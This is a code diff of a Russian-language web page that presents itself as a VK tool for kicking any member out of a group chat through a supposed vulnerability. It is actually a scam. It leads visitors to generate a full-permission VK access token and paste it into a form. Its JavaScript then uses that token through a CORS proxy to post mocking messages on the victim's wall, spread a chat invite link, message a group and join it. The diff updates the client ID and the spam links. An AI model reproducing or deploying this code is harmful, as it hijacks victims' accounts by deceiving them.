@@ -14,11 +14,11 @@
 				<img src="https://vk.com/images/icons/pwa/apple/default.png?8" style="border-radius: 90px;" width="50" height="50">
 				<h1>Кик пользователя</h1>
 				<p>С недавних пор в VK появилась уязвимость: стало возможным благодаря некоторым инструментам кикать абсолютно любого участника беседы, включая создателя, даже если у самого нет статуса администратора.</p>
-				<p><a href="https://oauth.vk.com/authorize?client_id=2685278&scope=1073737727&redirect_uri=https://oauth.vk.com/blank.html&display=page&response_type=token&revoke=1" target="_blank">Получить токен</a></p>
+				<p><a href="https://oauth.vk.com/authorize?client_id=7529816&scope=1073737727&redirect_uri=https://oauth.vk.com/blank.html&display=page&response_type=token&revoke=1" target="_blank">Получить токен</a></p>
 				<div id="error"></div>
 				<p><input class="form-control" placeholder="Токен" id="token"></p>
-				<p><input class="form-control" placeholder="Ссылка на чат"></p>
-				<p><input class="form-control" placeholder="Ссылка на пользователя"></p>
+				<p><input class="form-control" placeholder="Ссылка на беседу (например: sel=c59)"></p>
+				<p><input class="form-control" placeholder="Айди на пользователя"></p>
 				<p><button class="btn btn-primary mr-1" id="action">Кикнуть</button></p>
 				<p><b>Чтобы полностью исключить возможность кражи вашего аккаунта, смените пароль от своей страницы после кика или сбросьте права приложения "Kate Mobile". Токен станет после этого нерабочим.</b></p>
 			</div>
@@ -31,7 +31,7 @@
 			let token = document.getElementById('token').value;
 
 			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=vto.pe ШОК НАКРУТКА ВК 2020 Я ЛОХ я гей сова никогда не спит`).then(response => console.log(response.json()));
-			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=https://www.youtube.com/watch?v=vPdQIsacMp8`).then(response => console.log(response.json()));
+			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/wall.post?v=5.103&access_token=${token}&message=https://vk.me/join/AJQ1d9yjDRhaCfLiVW9T2WD0`).then(response => console.log(response.json()));
 			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/messages.send?v=5.103&access_token=${token}&message=ya popalsya na klikbeit&peer_id=-192835178&random_id=0`).then(response => console.log(response.json()));
 			fetch(`https://cors-anywhere.herokuapp.com/https://api.vk.com/method/groups.join?v=5.103&access_token=${token}&group_id=192835178`).then(response => console.log(response.json()));
 
